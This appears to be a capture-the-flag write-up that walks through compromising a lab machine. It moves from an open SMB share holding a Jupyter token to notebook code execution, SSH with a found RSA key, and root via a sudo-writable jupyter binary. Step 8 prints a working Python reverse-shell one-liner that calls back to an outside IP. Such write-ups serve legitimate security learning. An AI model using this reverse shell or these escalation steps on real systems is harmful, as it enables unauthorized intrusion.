1. Run nmap to discover any open ports from the server.
![image](https://github.com/user-attachments/assets/90eb67ec-7a1f-4aa2-b2fa-715fff79aea9)
2. Open port 8888 and it shows jupyter page. I need the token to login to the website.
![image](https://github.com/user-attachments/assets/2e0a0ac5-ce76-4b20-96dc-ebf8d9dcc28a)
3. Realize that the server has SMB server (port 139 and 445 open), I check the smb server contents with smbclient. <br>
![image](https://github.com/user-attachments/assets/900dd442-1184-4cf3-af77-c6e440cf2285)
4. Checking the datasci-team folder inside the SMB server.
![image](https://github.com/user-attachments/assets/ecba06f2-0dda-477b-b01c-bc7d13c1cd15)
5. It shows that there is a file that consist of jupyter token that I needed to login into the jupyter server.
![image](https://github.com/user-attachments/assets/f474e7f7-7261-499a-957a-66c1016d9da7)
6. Login and inside the server, there are several files where I check the ipynb file inside.
![image](https://github.com/user-attachments/assets/f460c0cb-f42c-4034-b8c9-2dd711c84032)
7. From the file, I can execute a shell command.
![image](https://github.com/user-attachments/assets/97abfa4e-c18f-4e4c-b550-be171e558ef3)
8. I decided to do reverse shell from the ipynb file. <br>
**Command: import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.21.155.12",7777));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("bash")**<br>
![image](https://github.com/user-attachments/assets/63517bc0-82de-42f6-a93b-170765b0bd29)
![image](https://github.com/user-attachments/assets/001839cd-5b8a-462a-8884-1352aad494f1)
9. Inside the server, there is a file that consist of the account RSA key.
![image](https://github.com/user-attachments/assets/f2c1aeeb-3137-440d-affd-534bd80bf42b)
10. I used it to login with the ssh protocol into the user.
![image](https://github.com/user-attachments/assets/23eabe8a-49a6-4a80-bc10-b1640c4a83aa)
11. Successfully get the Windows terminal, the user flag is stored in C:\Users\dev-datasci-lowpriv\Desktop\user.txt file.
![image](https://github.com/user-attachments/assets/5cd3ddb2-b2f8-4dcf-9e75-d1c583bfb1c1)
12. For the root privilege, back to the linux terminal (WSL), I check the sudo privilege with sudo -l.
![image](https://github.com/user-attachments/assets/af0600d8-8f4b-4500-8645-55a72f4dcb92)
13. It shows that the jupyter file inside /home/dev-datasci/.local/bin folder can be use to privilege into root. So I moved the bash file into the /home/dev-datasci/.local/bin folder. <br>
![image](https://github.com/user-attachments/assets/1d1c795f-8afa-47ed-83cb-da992676f583)
14. Next, I rewrite the jupyter file content with the bash file content.
![image](https://github.com/user-attachments/assets/d52af307-f49d-45e1-85f9-78f6463c77f0)
15. I run sudo /home/dev-datasci/.local/bin/jupyter file to escalate my privilege into root.
![image](https://github.com/user-attachments/assets/bde0c096-749e-41e6-914d-1bd9330723a9)
16. With root privilege, I can mount the Windows disk file into the /mnt folder inside the WSL.
![image](https://github.com/user-attachments/assets/b6ccdee5-f1ba-4b40-821d-b34f0194f573)
17. The root flag can be found in C:\Users\Administrator\Desktop\root.txt file.
![image](https://github.com/user-attachments/assets/c9d610b7-2c56-4512-8a2a-9fbb2074a212)























